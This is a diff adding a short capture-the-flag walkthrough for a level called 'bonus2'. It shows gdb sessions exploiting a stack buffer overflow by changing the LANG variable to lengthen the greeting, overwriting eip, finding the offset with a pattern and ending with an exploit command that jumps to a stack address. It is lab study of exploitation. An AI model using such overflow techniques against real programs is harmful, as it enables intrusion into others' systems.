@@ -1,0 +1,51 @@
+ ▄▄                                                           ▄▄▄▄▄
+ ██                                                          █▀▀▀▀██▄
+ ██▄███▄    ▄████▄   ██▄████▄  ██    ██  ▄▄█████▄                  ██
+ ██▀  ▀██  ██▀  ▀██  ██▀   ██  ██    ██  ██▄▄▄▄ ▀                ▄█▀
+ ██    ██  ██    ██  ██    ██  ██    ██   ▀▀▀▀██▄              ▄█▀
+ ███▄▄██▀  ▀██▄▄██▀  ██    ██  ██▄▄▄███  █▄▄▄▄▄██            ▄██▄▄▄▄▄
+ ▀▀ ▀▀▀      ▀▀▀▀    ▀▀    ▀▀   ▀▀▀▀ ▀▀   ▀▀▀▀▀▀             ▀▀▀▀▀▀▀▀
+
+We first recreate the original program in C.
+
+Then, we see that a buffer overflow is really easy
+
+(gdb) set env LANG=en
+(gdb) run $(python2 -c "print 'A'*40 + ' ' + 'B'*32")
+Program received signal SIGSEGV, Segmentation fault.
+0x08004242 in ?? ()
+
+We have almost overwritten a pointer (?).
+We canot use a longer input, but we can switch language :)
+
+Here are the size of the greetings:
+- en: 7
+- fi: 19
+- nl: 15
+
+(gdb) set env LANG=fi
+(gdb) run $(python2 -c "print 'A'*40 + ' ' + 'B'*32")
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) i r
+ebp            0x42424242       0x42424242
+eip            0x42424242       0x42424242
+(...)
+
+We have overriden eip !
+
+Again, we use We are again using https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+(gdb) run $(python2 -c "print 'A'*40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+0x41366141 in ?? ()
+-> offset is 18
+
+Now, we cannot jump anywhere (like in an env var), but we can ret to libc.
+
+-> TODO: ret to libc
+
+
+
+
+
+
+~$ LANG=fi ./bonus2 $(python -c "print 'A'*40 + ' ' + 'B'*18 + '\x5a\xff\xff\xbf'")
